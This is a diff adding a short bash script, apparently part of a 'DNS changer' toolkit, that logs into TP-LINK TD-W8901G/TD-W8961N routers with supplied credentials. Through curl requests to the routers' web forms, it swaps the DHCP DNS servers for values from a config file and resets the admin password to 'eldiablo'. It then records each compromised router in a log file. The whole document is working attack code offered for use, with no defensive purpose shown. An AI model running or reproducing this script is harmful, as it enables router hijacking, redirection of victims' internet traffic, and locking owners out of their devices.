@@ -1,0 +1,18 @@
+#!/bin/bash
+
+##########################
+# by bonny               #
+##########################
+# CONFIG
+source configs/changers.cfg
+HOSTNAME="$1"
+USERNAME="$2"
+PASSWORD="$3"
+PASSWD="eldiablo"
+###########################
+
+${CURL} -u "$USERNAME:$PASSWORD" -d "dhcpTypeRadio=1" "http://$HOSTNAME/Forms/home_lan_1" -d "sysPoolCount=201" "http://$HOSTNAME/Forms/home_lan_1" -d "dhcp_StartIP=192.168.1.2" "http://$HOSTNAME/Forms/home_lan_1" -d "uiViewIPAddr=192.168.1.1" "http://$HOSTNAME/Forms/home_lan_1" -d "uiViewDNSRelay=Use%20User%20Discovered%20DNS%20Server%20Only" "http://$HOSTNAME/Forms/home_lan_1" -d "uiViewDns1Mark=$DNS1" "http://$HOSTNAME/Forms/home_lan_1" -d "uiViewDns2Mark=$DNS2" "http://$HOSTNAME/Forms/home_lan_1" 1>/dev/null 2>/dev/null
+${CURL} -u "$USERNAME:$PASSWORD" -d "uiViewTools_Password=$PASSWD&uiViewTools_PasswordConfirm=$PASSWD" "http://$HOSTNAME/Forms/tools_admin_1" 1>/dev/null 2>/dev/null
+
+echo "[+] modificado, http://${HOSTNAME} ${USERNAME}:${PASSWORD} [TP-LINK TD-W8901G/TD-W8961NDTD-8816 - KAIOMY]"
+echo "http://${HOSTNAME} (${USERNAME}:${PASSWORD} => ${PASSWD}) [TP-LINK TD-W8901G/TD-W8961NDTD-8816 - KAIOMY]" >> logs/modificados.log
